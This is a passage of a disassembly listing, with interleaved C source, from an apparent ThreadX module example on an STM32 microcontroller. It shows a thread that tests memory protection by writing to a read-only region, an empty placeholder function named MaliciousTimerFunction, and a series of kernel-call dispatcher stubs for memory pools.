 8020416:	2200      	movs	r2, #0
 8020418:	4618      	mov	r0, r3
 802041a:	f000 fe15 	bl	8021048 <_txe_queue_send>
  readbuffer = *(ULONG*)READONLY_REGION;
 802041e:	4b17      	ldr	r3, [pc, #92]	; (802047c <MainThread_Entry+0x1d0>)
 8020420:	681b      	ldr	r3, [r3, #0]
 8020422:	61fb      	str	r3, [r7, #28]
  tx_thread_sleep(TX_TIMER_TICKS_PER_SECOND / 10);
 8020424:	200a      	movs	r0, #10
 8020426:	f001 f8af 	bl	8021588 <_tx_thread_sleep>

  /* Writing to read only region */
  s_msg = WRITING_TO_READONLY;
 802042a:	234d      	movs	r3, #77	; 0x4d
 802042c:	61bb      	str	r3, [r7, #24]
  tx_queue_send(ResidentQueue, &s_msg, TX_NO_WAIT);
 802042e:	4b19      	ldr	r3, [pc, #100]	; (8020494 <MainThread_Entry+0x1e8>)
 8020430:	f859 3003 	ldr.w	r3, [r9, r3]
 8020434:	681b      	ldr	r3, [r3, #0]
 8020436:	f107 0118 	add.w	r1, r7, #24
 802043a:	2200      	movs	r2, #0
 802043c:	4618      	mov	r0, r3
 802043e:	f000 fe03 	bl	8021048 <_txe_queue_send>
  *(ULONG *)READONLY_REGION = 0xABABABAB;
 8020442:	4b0e      	ldr	r3, [pc, #56]	; (802047c <MainThread_Entry+0x1d0>)
 8020444:	f04f 32ab 	mov.w	r2, #2880154539	; 0xabababab
 8020448:	601a      	str	r2, [r3, #0]
  tx_thread_sleep(TX_TIMER_TICKS_PER_SECOND / 10);
 802044a:	200a      	movs	r0, #10
 802044c:	f001 f89c 	bl	8021588 <_tx_thread_sleep>

  /* Notify module manager about job finish */
  s_msg = PROCESSING_FINISHED;
 8020450:	232c      	movs	r3, #44	; 0x2c
 8020452:	61bb      	str	r3, [r7, #24]
  tx_queue_send(ResidentQueue, &s_msg, TX_NO_WAIT);
 8020454:	4b0f      	ldr	r3, [pc, #60]	; (8020494 <MainThread_Entry+0x1e8>)
 8020456:	f859 3003 	ldr.w	r3, [r9, r3]
 802045a:	681b      	ldr	r3, [r3, #0]
 802045c:	f107 0118 	add.w	r1, r7, #24
 8020460:	2200      	movs	r2, #0
 8020462:	4618      	mov	r0, r3
 8020464:	f000 fdf0 	bl	8021048 <_txe_queue_send>
  UNUSED(readbuffer);

  /* Stay here, waiting for the module manager to stop and loading the module*/
  while(1)
  {
    tx_thread_sleep(10);
 8020468:	200a      	movs	r0, #10
 802046a:	f001 f88d 	bl	8021588 <_tx_thread_sleep>
 802046e:	e7fb      	b.n	8020468 <MainThread_Entry+0x1bc>
 8020470:	54485244 	.word	0x54485244
 8020474:	e000ed94 	.word	0xe000ed94
 8020478:	20010100 	.word	0x20010100
 802047c:	20010000 	.word	0x20010000
 8020480:	00000000 	.word	0x00000000
 8020484:	000017d0 	.word	0x000017d0
 8020488:	0000000c 	.word	0x0000000c
 802048c:	00000018 	.word	0x00000018
 8020490:	0000178e 	.word	0x0000178e
 8020494:	00000008 	.word	0x00000008
 8020498:	0000172a 	.word	0x0000172a

0802049c <Error_Handler>:
/**
  * @brief  This function is executed in case of error occurrence.
  * @retval None
  */
void Error_Handler(void)
{
 802049c:	b580      	push	{r7, lr}
 802049e:	af00      	add	r7, sp, #0
  /* Nothing to do, block here */
  tx_thread_sleep(TX_WAIT_FOREVER);
 80204a0:	f04f 30ff 	mov.w	r0, #4294967295
 80204a4:	f001 f870 	bl	8021588 <_tx_thread_sleep>
}
 80204a8:	bf00      	nop
 80204aa:	bd80      	pop	{r7, pc}

080204ac <MaliciousTimerFunction>:

void MaliciousTimerFunction(ULONG input)
{
 80204ac:	b480      	push	{r7}
 80204ae:	b083      	sub	sp, #12
 80204b0:	af00      	add	r7, sp, #0
 80204b2:	6078      	str	r0, [r7, #4]

}
 80204b4:	bf00      	nop
 80204b6:	370c      	adds	r7, #12
 80204b8:	46bd      	mov	sp, r7
 80204ba:	f85d 7b04 	ldr.w	r7, [sp], #4
 80204be:	4770      	bx	lr

080204c0 <_txe_block_allocate>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_block_allocate(TX_BLOCK_POOL *pool_ptr, VOID **block_ptr, ULONG wait_option)
{
 80204c0:	b590      	push	{r4, r7, lr}
 80204c2:	b087      	sub	sp, #28
 80204c4:	af00      	add	r7, sp, #0
 80204c6:	60f8      	str	r0, [r7, #12]
 80204c8:	60b9      	str	r1, [r7, #8]
 80204ca:	607a      	str	r2, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_BLOCK_ALLOCATE_CALL, (ALIGN_TYPE) pool_ptr, (ALIGN_TYPE) block_ptr, (ALIGN_TYPE) wait_option);
 80204cc:	4b07      	ldr	r3, [pc, #28]	; (80204ec <_txe_block_allocate+0x2c>)
 80204ce:	f859 3003 	ldr.w	r3, [r9, r3]
 80204d2:	681c      	ldr	r4, [r3, #0]
 80204d4:	68f9      	ldr	r1, [r7, #12]
 80204d6:	68ba      	ldr	r2, [r7, #8]
 80204d8:	687b      	ldr	r3, [r7, #4]
 80204da:	2001      	movs	r0, #1
 80204dc:	47a0      	blx	r4
 80204de:	6178      	str	r0, [r7, #20]

    /* Return value to the caller.  */
    return(return_value);
 80204e0:	697b      	ldr	r3, [r7, #20]
}
 80204e2:	4618      	mov	r0, r3
 80204e4:	371c      	adds	r7, #28
 80204e6:	46bd      	mov	sp, r7
 80204e8:	bd90      	pop	{r4, r7, pc}
 80204ea:	bf00      	nop
 80204ec:	00000004 	.word	0x00000004

080204f0 <_txe_block_pool_create>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_block_pool_create(TX_BLOCK_POOL *pool_ptr, CHAR *name_ptr, ULONG block_size, VOID *pool_start, ULONG pool_size, UINT pool_control_block_size)
{
 80204f0:	b590      	push	{r4, r7, lr}
 80204f2:	b08b      	sub	sp, #44	; 0x2c
 80204f4:	af00      	add	r7, sp, #0
 80204f6:	60f8      	str	r0, [r7, #12]
 80204f8:	60b9      	str	r1, [r7, #8]
 80204fa:	607a      	str	r2, [r7, #4]
 80204fc:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[4];

    extra_parameters[0] = (ALIGN_TYPE) block_size;
 80204fe:	687b      	ldr	r3, [r7, #4]
 8020500:	617b      	str	r3, [r7, #20]
    extra_parameters[1] = (ALIGN_TYPE) pool_start;
 8020502:	683b      	ldr	r3, [r7, #0]
 8020504:	61bb      	str	r3, [r7, #24]
    extra_parameters[2] = (ALIGN_TYPE) pool_size;
 8020506:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8020508:	61fb      	str	r3, [r7, #28]
    extra_parameters[3] = (ALIGN_TYPE) pool_control_block_size;
 802050a:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 802050c:	623b      	str	r3, [r7, #32]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_BLOCK_POOL_CREATE_CALL, (ALIGN_TYPE) pool_ptr, (ALIGN_TYPE) name_ptr, (ALIGN_TYPE) extra_parameters);
 802050e:	4b08      	ldr	r3, [pc, #32]	; (8020530 <_txe_block_pool_create+0x40>)
 8020510:	f859 3003 	ldr.w	r3, [r9, r3]
 8020514:	681c      	ldr	r4, [r3, #0]
 8020516:	68f9      	ldr	r1, [r7, #12]
 8020518:	68ba      	ldr	r2, [r7, #8]
 802051a:	f107 0314 	add.w	r3, r7, #20
 802051e:	2002      	movs	r0, #2
 8020520:	47a0      	blx	r4
 8020522:	6278      	str	r0, [r7, #36]	; 0x24

    /* Return value to the caller.  */
    return(return_value);
 8020524:	6a7b      	ldr	r3, [r7, #36]	; 0x24
}
 8020526:	4618      	mov	r0, r3
 8020528:	372c      	adds	r7, #44	; 0x2c
 802052a:	46bd      	mov	sp, r7
 802052c:	bd90      	pop	{r4, r7, pc}
 802052e:	bf00      	nop
 8020530:	00000004 	.word	0x00000004

08020534 <_txe_block_pool_delete>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_block_pool_delete(TX_BLOCK_POOL *pool_ptr)
{
 8020534:	b590      	push	{r4, r7, lr}
 8020536:	b085      	sub	sp, #20
 8020538:	af00      	add	r7, sp, #0
 802053a:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_BLOCK_POOL_DELETE_CALL, (ALIGN_TYPE) pool_ptr, 0, 0);
 802053c:	4b07      	ldr	r3, [pc, #28]	; (802055c <_txe_block_pool_delete+0x28>)
 802053e:	f859 3003 	ldr.w	r3, [r9, r3]
 8020542:	681c      	ldr	r4, [r3, #0]
 8020544:	6879      	ldr	r1, [r7, #4]
 8020546:	2300      	movs	r3, #0
 8020548:	2200      	movs	r2, #0
 802054a:	2003      	movs	r0, #3
 802054c:	47a0      	blx	r4
 802054e:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 8020550:	68fb      	ldr	r3, [r7, #12]
}
 8020552:	4618      	mov	r0, r3
 8020554:	3714      	adds	r7, #20
 8020556:	46bd      	mov	sp, r7
 8020558:	bd90      	pop	{r4, r7, pc}
 802055a:	bf00      	nop
 802055c:	00000004 	.word	0x00000004

08020560 <_txe_block_pool_info_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_block_pool_info_get(TX_BLOCK_POOL *pool_ptr, CHAR **name, ULONG *available_blocks, ULONG *total_blocks, TX_THREAD **first_suspended, ULONG *suspended_count, TX_BLOCK_POOL **next_pool)
{
 8020560:	b590      	push	{r4, r7, lr}
 8020562:	b08b      	sub	sp, #44	; 0x2c
 8020564:	af00      	add	r7, sp, #0
 8020566:	60f8      	str	r0, [r7, #12]
 8020568:	60b9      	str	r1, [r7, #8]
 802056a:	607a      	str	r2, [r7, #4]
 802056c:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[5];

    extra_parameters[0] = (ALIGN_TYPE) available_blocks;
 802056e:	687b      	ldr	r3, [r7, #4]
 8020570:	613b      	str	r3, [r7, #16]
    extra_parameters[1] = (ALIGN_TYPE) total_blocks;
 8020572:	683b      	ldr	r3, [r7, #0]
 8020574:	617b      	str	r3, [r7, #20]
    extra_parameters[2] = (ALIGN_TYPE) first_suspended;
 8020576:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8020578:	61bb      	str	r3, [r7, #24]
    extra_parameters[3] = (ALIGN_TYPE) suspended_count;
 802057a:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 802057c:	61fb      	str	r3, [r7, #28]
    extra_parameters[4] = (ALIGN_TYPE) next_pool;
 802057e:	6c3b      	ldr	r3, [r7, #64]	; 0x40
 8020580:	623b      	str	r3, [r7, #32]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_BLOCK_POOL_INFO_GET_CALL, (ALIGN_TYPE) pool_ptr, (ALIGN_TYPE) name, (ALIGN_TYPE) extra_parameters);
 8020582:	4b08      	ldr	r3, [pc, #32]	; (80205a4 <_txe_block_pool_info_get+0x44>)
 8020584:	f859 3003 	ldr.w	r3, [r9, r3]
 8020588:	681c      	ldr	r4, [r3, #0]
 802058a:	68f9      	ldr	r1, [r7, #12]
 802058c:	68ba      	ldr	r2, [r7, #8]
 802058e:	f107 0310 	add.w	r3, r7, #16
 8020592:	2004      	movs	r0, #4
 8020594:	47a0      	blx	r4
 8020596:	6278      	str	r0, [r7, #36]	; 0x24

    /* Return value to the caller.  */
    return(return_value);
 8020598:	6a7b      	ldr	r3, [r7, #36]	; 0x24
}
 802059a:	4618      	mov	r0, r3
 802059c:	372c      	adds	r7, #44	; 0x2c
 802059e:	46bd      	mov	sp, r7
 80205a0:	bd90      	pop	{r4, r7, pc}
 80205a2:	bf00      	nop
 80205a4:	00000004 	.word	0x00000004

080205a8 <_tx_block_pool_performance_info_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _tx_block_pool_performance_info_get(TX_BLOCK_POOL *pool_ptr, ULONG *allocates, ULONG *releases, ULONG *suspensions, ULONG *timeouts)
{
 80205a8:	b590      	push	{r4, r7, lr}
 80205aa:	b089      	sub	sp, #36	; 0x24
 80205ac:	af00      	add	r7, sp, #0
 80205ae:	60f8      	str	r0, [r7, #12]
 80205b0:	60b9      	str	r1, [r7, #8]
 80205b2:	607a      	str	r2, [r7, #4]
 80205b4:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[3];

    extra_parameters[0] = (ALIGN_TYPE) releases;
 80205b6:	687b      	ldr	r3, [r7, #4]
 80205b8:	613b      	str	r3, [r7, #16]
    extra_parameters[1] = (ALIGN_TYPE) suspensions;
 80205ba:	683b      	ldr	r3, [r7, #0]
 80205bc:	617b      	str	r3, [r7, #20]
    extra_parameters[2] = (ALIGN_TYPE) timeouts;
 80205be:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 80205c0:	61bb      	str	r3, [r7, #24]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_BLOCK_POOL_PERFORMANCE_INFO_GET_CALL, (ALIGN_TYPE) pool_ptr, (ALIGN_TYPE) allocates, (ALIGN_TYPE) extra_parameters);
 80205c2:	4b08      	ldr	r3, [pc, #32]	; (80205e4 <_tx_block_pool_performance_info_get+0x3c>)
 80205c4:	f859 3003 	ldr.w	r3, [r9, r3]
 80205c8:	681c      	ldr	r4, [r3, #0]
 80205ca:	68f9      	ldr	r1, [r7, #12]
 80205cc:	68ba      	ldr	r2, [r7, #8]
 80205ce:	f107 0310 	add.w	r3, r7, #16
 80205d2:	2005      	movs	r0, #5
 80205d4:	47a0      	blx	r4
 80205d6:	61f8      	str	r0, [r7, #28]

    /* Return value to the caller.  */
    return(return_value);
 80205d8:	69fb      	ldr	r3, [r7, #28]
}
 80205da:	4618      	mov	r0, r3
 80205dc:	3724      	adds	r7, #36	; 0x24
 80205de:	46bd      	mov	sp, r7
 80205e0:	bd90      	pop	{r4, r7, pc}
 80205e2:	bf00      	nop
 80205e4:	00000004 	.word	0x00000004

080205e8 <_tx_block_pool_performance_system_info_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _tx_block_pool_performance_system_info_get(ULONG *allocates, ULONG *releases, ULONG *suspensions, ULONG *timeouts)
{
 80205e8:	b590      	push	{r4, r7, lr}
 80205ea:	b089      	sub	sp, #36	; 0x24
 80205ec:	af00      	add	r7, sp, #0
 80205ee:	60f8      	str	r0, [r7, #12]
 80205f0:	60b9      	str	r1, [r7, #8]
 80205f2:	607a      	str	r2, [r7, #4]
 80205f4:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[2];

    extra_parameters[0] = (ALIGN_TYPE) suspensions;
 80205f6:	687b      	ldr	r3, [r7, #4]
 80205f8:	617b      	str	r3, [r7, #20]
    extra_parameters[1] = (ALIGN_TYPE) timeouts;
 80205fa:	683b      	ldr	r3, [r7, #0]
 80205fc:	61bb      	str	r3, [r7, #24]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_BLOCK_POOL_PERFORMANCE_SYSTEM_INFO_GET_CALL, (ALIGN_TYPE) allocates, (ALIGN_TYPE) releases, (ALIGN_TYPE) extra_parameters);
 80205fe:	4b08      	ldr	r3, [pc, #32]	; (8020620 <_tx_block_pool_performance_system_info_get+0x38>)
 8020600:	f859 3003 	ldr.w	r3, [r9, r3]
 8020604:	681c      	ldr	r4, [r3, #0]
 8020606:	68f9      	ldr	r1, [r7, #12]
 8020608:	68ba      	ldr	r2, [r7, #8]
 802060a:	f107 0314 	add.w	r3, r7, #20
 802060e:	2006      	movs	r0, #6
 8020610:	47a0      	blx	r4
 8020612:	61f8      	str	r0, [r7, #28]

    /* Return value to the caller.  */
    return(return_value);
 8020614:	69fb      	ldr	r3, [r7, #28]
}
 8020616:	4618      	mov	r0, r3
 8020618:	3724      	adds	r7, #36	; 0x24
 802061a:	46bd      	mov	sp, r7
 802061c:	bd90      	pop	{r4, r7, pc}
 802061e:	bf00      	nop
 8020620:	00000004 	.word	0x00000004

08020624 <_txe_block_pool_prioritize>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_block_pool_prioritize(TX_BLOCK_POOL *pool_ptr)
{
 8020624:	b590      	push	{r4, r7, lr}
 8020626:	b085      	sub	sp, #20
 8020628:	af00      	add	r7, sp, #0
 802062a:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_BLOCK_POOL_PRIORITIZE_CALL, (ALIGN_TYPE) pool_ptr, 0, 0);
 802062c:	4b07      	ldr	r3, [pc, #28]	; (802064c <_txe_block_pool_prioritize+0x28>)
 802062e:	f859 3003 	ldr.w	r3, [r9, r3]
 8020632:	681c      	ldr	r4, [r3, #0]
 8020634:	6879      	ldr	r1, [r7, #4]
 8020636:	2300      	movs	r3, #0
 8020638:	2200      	movs	r2, #0
 802063a:	2007      	movs	r0, #7
 802063c:	47a0      	blx	r4
 802063e:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 8020640:	68fb      	ldr	r3, [r7, #12]
}
 8020642:	4618      	mov	r0, r3
 8020644:	3714      	adds	r7, #20
 8020646:	46bd      	mov	sp, r7
 8020648:	bd90      	pop	{r4, r7, pc}
 802064a:	bf00      	nop
 802064c:	00000004 	.word	0x00000004

08020650 <_txe_block_release>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_block_release(VOID *block_ptr)
{
 8020650:	b590      	push	{r4, r7, lr}
 8020652:	b085      	sub	sp, #20
 8020654:	af00      	add	r7, sp, #0
 8020656:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_BLOCK_RELEASE_CALL, (ALIGN_TYPE) block_ptr, 0, 0);
 8020658:	4b07      	ldr	r3, [pc, #28]	; (8020678 <_txe_block_release+0x28>)
 802065a:	f859 3003 	ldr.w	r3, [r9, r3]
 802065e:	681c      	ldr	r4, [r3, #0]
 8020660:	6879      	ldr	r1, [r7, #4]
 8020662:	2300      	movs	r3, #0
 8020664:	2200      	movs	r2, #0
 8020666:	2008      	movs	r0, #8
 8020668:	47a0      	blx	r4
 802066a:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 802066c:	68fb      	ldr	r3, [r7, #12]
}
 802066e:	4618      	mov	r0, r3
 8020670:	3714      	adds	r7, #20
 8020672:	46bd      	mov	sp, r7
 8020674:	bd90      	pop	{r4, r7, pc}
 8020676:	bf00      	nop
 8020678:	00000004 	.word	0x00000004

0802067c <_txe_byte_allocate>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_byte_allocate(TX_BYTE_POOL *pool_ptr, VOID **memory_ptr, ULONG memory_size, ULONG wait_option)
{
 802067c:	b590      	push	{r4, r7, lr}
 802067e:	b089      	sub	sp, #36	; 0x24
 8020680:	af00      	add	r7, sp, #0
 8020682:	60f8      	str	r0, [r7, #12]
 8020684:	60b9      	str	r1, [r7, #8]
 8020686:	607a      	str	r2, [r7, #4]
 8020688:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[2];

    extra_parameters[0] = (ALIGN_TYPE) memory_size;
 802068a:	687b      	ldr	r3, [r7, #4]
 802068c:	617b      	str	r3, [r7, #20]
    extra_parameters[1] = (ALIGN_TYPE) wait_option;
 802068e:	683b      	ldr	r3, [r7, #0]
 8020690:	61bb      	str	r3, [r7, #24]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_BYTE_ALLOCATE_CALL, (ALIGN_TYPE) pool_ptr, (ALIGN_TYPE) memory_ptr, (ALIGN_TYPE) extra_parameters);
 8020692:	4b08      	ldr	r3, [pc, #32]	; (80206b4 <_txe_byte_allocate+0x38>)
 8020694:	f859 3003 	ldr.w	r3, [r9, r3]
 8020698:	681c      	ldr	r4, [r3, #0]
 802069a:	68f9      	ldr	r1, [r7, #12]
 802069c:	68ba      	ldr	r2, [r7, #8]
 802069e:	f107 0314 	add.w	r3, r7, #20
 80206a2:	2009      	movs	r0, #9
 80206a4:	47a0      	blx	r4
 80206a6:	61f8      	str	r0, [r7, #28]

    /* Return value to the caller.  */
    return(return_value);
 80206a8:	69fb      	ldr	r3, [r7, #28]
}
 80206aa:	4618      	mov	r0, r3
 80206ac:	3724      	adds	r7, #36	; 0x24
 80206ae:	46bd      	mov	sp, r7
 80206b0:	bd90      	pop	{r4, r7, pc}
 80206b2:	bf00      	nop
 80206b4:	00000004 	.word	0x00000004

080206b8 <_txe_byte_pool_create>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_byte_pool_create(TX_BYTE_POOL *pool_ptr, CHAR *name_ptr, VOID *pool_start, ULONG pool_size, UINT pool_control_block_size)
{
 80206b8:	b590      	push	{r4, r7, lr}
 80206ba:	b089      	sub	sp, #36	; 0x24
 80206bc:	af00      	add	r7, sp, #0
 80206be:	60f8      	str	r0, [r7, #12]
 80206c0:	60b9      	str	r1, [r7, #8]
 80206c2:	607a      	str	r2, [r7, #4]
 80206c4:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[3];

    extra_parameters[0] = (ALIGN_TYPE) pool_start;
 80206c6:	687b      	ldr	r3, [r7, #4]
 80206c8:	613b      	str	r3, [r7, #16]
    extra_parameters[1] = (ALIGN_TYPE) pool_size;
 80206ca:	683b      	ldr	r3, [r7, #0]
 80206cc:	617b      	str	r3, [r7, #20]
    extra_parameters[2] = (ALIGN_TYPE) pool_control_block_size;
 80206ce:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 80206d0:	61bb      	str	r3, [r7, #24]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_BYTE_POOL_CREATE_CALL, (ALIGN_TYPE) pool_ptr, (ALIGN_TYPE) name_ptr, (ALIGN_TYPE) extra_parameters);
 80206d2:	4b08      	ldr	r3, [pc, #32]	; (80206f4 <_txe_byte_pool_create+0x3c>)
 80206d4:	f859 3003 	ldr.w	r3, [r9, r3]
 80206d8:	681c      	ldr	r4, [r3, #0]
 80206da:	68f9      	ldr	r1, [r7, #12]
 80206dc:	68ba      	ldr	r2, [r7, #8]
 80206de:	f107 0310 	add.w	r3, r7, #16
 80206e2:	200a      	movs	r0, #10
 80206e4:	47a0      	blx	r4
 80206e6:	61f8      	str	r0, [r7, #28]

    /* Return value to the caller.  */
    return(return_value);
 80206e8:	69fb      	ldr	r3, [r7, #28]
}
 80206ea:	4618      	mov	r0, r3
 80206ec:	3724      	adds	r7, #36	; 0x24
 80206ee:	46bd      	mov	sp, r7
 80206f0:	bd90      	pop	{r4, r7, pc}
 80206f2:	bf00      	nop
 80206f4:	00000004 	.word	0x00000004

080206f8 <_txe_byte_pool_delete>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_byte_pool_delete(TX_BYTE_POOL *pool_ptr)
{
 80206f8:	b590      	push	{r4, r7, lr}
 80206fa:	b085      	sub	sp, #20
 80206fc:	af00      	add	r7, sp, #0
 80206fe:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_BYTE_POOL_DELETE_CALL, (ALIGN_TYPE) pool_ptr, 0, 0);
 8020700:	4b07      	ldr	r3, [pc, #28]	; (8020720 <_txe_byte_pool_delete+0x28>)
 8020702:	f859 3003 	ldr.w	r3, [r9, r3]
 8020706:	681c      	ldr	r4, [r3, #0]
 8020708:	6879      	ldr	r1, [r7, #4]
 802070a:	2300      	movs	r3, #0
 802070c:	2200      	movs	r2, #0
 802070e:	200b      	movs	r0, #11
 8020710:	47a0      	blx	r4
 8020712:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 8020714:	68fb      	ldr	r3, [r7, #12]
}
 8020716:	4618      	mov	r0, r3
 8020718:	3714      	adds	r7, #20
 802071a:	46bd      	mov	sp, r7
 802071c:	bd90      	pop	{r4, r7, pc}
 802071e:	bf00      	nop
 8020720:	00000004 	.word	0x00000004

08020724 <_txe_byte_pool_info_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_byte_pool_info_get(TX_BYTE_POOL *pool_ptr, CHAR **name, ULONG *available_bytes, ULONG *fragments, TX_THREAD **first_suspended, ULONG *suspended_count, TX_BYTE_POOL **next_pool)
{
 8020724:	b590      	push	{r4, r7, lr}
 8020726:	b08b      	sub	sp, #44	; 0x2c
 8020728:	af00      	add	r7, sp, #0
 802072a:	60f8      	str	r0, [r7, #12]
 802072c:	60b9      	str	r1, [r7, #8]
 802072e:	607a      	str	r2, [r7, #4]
 8020730:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[5];

    extra_parameters[0] = (ALIGN_TYPE) available_bytes;
 8020732:	687b      	ldr	r3, [r7, #4]
 8020734:	613b      	str	r3, [r7, #16]
    extra_parameters[1] = (ALIGN_TYPE) fragments;
 8020736:	683b      	ldr	r3, [r7, #0]
 8020738:	617b      	str	r3, [r7, #20]
    extra_parameters[2] = (ALIGN_TYPE) first_suspended;
 802073a:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 802073c:	61bb      	str	r3, [r7, #24]
    extra_parameters[3] = (ALIGN_TYPE) suspended_count;
 802073e:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 8020740:	61fb      	str	r3, [r7, #28]
    extra_parameters[4] = (ALIGN_TYPE) next_pool;
 8020742:	6c3b      	ldr	r3, [r7, #64]	; 0x40
 8020744:	623b      	str	r3, [r7, #32]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_BYTE_POOL_INFO_GET_CALL, (ALIGN_TYPE) pool_ptr, (ALIGN_TYPE) name, (ALIGN_TYPE) extra_parameters);
 8020746:	4b08      	ldr	r3, [pc, #32]	; (8020768 <_txe_byte_pool_info_get+0x44>)
 8020748:	f859 3003 	ldr.w	r3, [r9, r3]
 802074c:	681c      	ldr	r4, [r3, #0]
 802074e:	68f9      	ldr	r1, [r7, #12]
 8020750:	68ba      	ldr	r2, [r7, #8]
 8020752:	f107 0310 	add.w	r3, r7, #16
 8020756:	200c      	movs	r0, #12
 8020758:	47a0      	blx	r4
 802075a:	6278      	str	r0, [r7, #36]	; 0x24

    /* Return value to the caller.  */
    return(return_value);
 802075c:	6a7b      	ldr	r3, [r7, #36]	; 0x24
}
 802075e:	4618      	mov	r0, r3
 8020760:	372c      	adds	r7, #44	; 0x2c
 8020762:	46bd      	mov	sp, r7
 8020764:	bd90      	pop	{r4, r7, pc}
 8020766:	bf00      	nop
 8020768:	00000004 	.word	0x00000004

0802076c <_tx_byte_pool_performance_info_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _tx_byte_pool_performance_info_get(TX_BYTE_POOL *pool_ptr, ULONG *allocates, ULONG *releases, ULONG *fragments_searched, ULONG *merges, ULONG *splits, ULONG *suspensions, ULONG *timeouts)
{
 802076c:	b590      	push	{r4, r7, lr}
 802076e:	b08d      	sub	sp, #52	; 0x34
 8020770:	af00      	add	r7, sp, #0
 8020772:	60f8      	str	r0, [r7, #12]
 8020774:	60b9      	str	r1, [r7, #8]
 8020776:	607a      	str	r2, [r7, #4]
 8020778:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[6];

    extra_parameters[0] = (ALIGN_TYPE) releases;
 802077a:	687b      	ldr	r3, [r7, #4]
 802077c:	617b      	str	r3, [r7, #20]
    extra_parameters[1] = (ALIGN_TYPE) fragments_searched;
 802077e:	683b      	ldr	r3, [r7, #0]
 8020780:	61bb      	str	r3, [r7, #24]
    extra_parameters[2] = (ALIGN_TYPE) merges;
 8020782:	6c3b      	ldr	r3, [r7, #64]	; 0x40
 8020784:	61fb      	str	r3, [r7, #28]
    extra_parameters[3] = (ALIGN_TYPE) splits;
 8020786:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8020788:	623b      	str	r3, [r7, #32]
    extra_parameters[4] = (ALIGN_TYPE) suspensions;
 802078a:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 802078c:	627b      	str	r3, [r7, #36]	; 0x24
    extra_parameters[5] = (ALIGN_TYPE) timeouts;
 802078e:	6cfb      	ldr	r3, [r7, #76]	; 0x4c
 8020790:	62bb      	str	r3, [r7, #40]	; 0x28

    /* Call module manager dispatcher.  */
